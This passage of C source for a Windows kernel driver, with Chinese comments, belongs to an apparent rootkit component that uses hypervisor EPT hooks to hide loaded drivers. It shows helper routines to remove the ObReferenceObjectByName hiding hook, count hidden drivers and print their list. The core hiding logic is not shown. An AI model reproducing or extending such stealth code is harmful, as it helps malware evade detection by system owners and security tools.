    DbgPrint("[EPT-Hook] =====================================================\n");
    
    return status;
}

/*
 * 移除驱动隐藏 Hook
 */
NTSTATUS
EptHookRemoveDriverHideHook(VOID)
{
    NTSTATUS status = STATUS_SUCCESS;
    
    DbgPrint("[EPT-Hook] Removing driver hide hooks...\n");
    
    // 移除 ObReferenceObjectByName Hook
    if (g_ObReferenceObjectByNameHook) {
        status = EptHookRemove(g_ObReferenceObjectByNameHook);
        if (NT_SUCCESS(status)) {
            g_ObReferenceObjectByNameHook = NULL;
            InterlockedExchangePointer(
                (PVOID volatile *)&g_OriginalObReferenceObjectByName,
                NULL);
        }
    }
    
    // 注意：NtQuerySystemInformation Hook 由进程隐藏功能共享，不在这里移除
    
    return status;
}

/*
 * 获取隐藏驱动数量
 */
ULONG
EptHookGetHiddenDriverCount(VOID)
{
    return g_HiddenDriverCount;
}

/*
 * 打印隐藏驱动列表
 */
VOID
EptHookPrintHiddenDrivers(VOID)
{
    KIRQL oldIrql;
    
    if (!g_HiddenDriverLockInitialized) {
        DbgPrint("[EPT-Hook] Hidden driver list not initialized\n");
        return;
    }
    
    DbgPrint("[EPT-Hook] ========== Hidden Drivers (EPT Hook) ==========\n");
    DbgPrint("[EPT-Hook] Count: %d\n", g_HiddenDriverCount);
    
    KeAcquireSpinLock(&g_HiddenDriverLock, &oldIrql);
    
    for (ULONG i = 0; i < g_HiddenDriverCount && i < MAX_HIDDEN_DRIVERS_EPT; i++) {
        if (g_HiddenDrivers[i].Active) {
            DbgPrint("[EPT-Hook]   [%d] %ws (Base=%p, Size=0x%X)\n",
                i,
                g_HiddenDrivers[i].DriverName,
                g_HiddenDrivers[i].DriverBase,
                g_HiddenDrivers[i].DriverSize);
        }
    }
    
    KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
    
    DbgPrint("[EPT-Hook] ================================================\n");
}
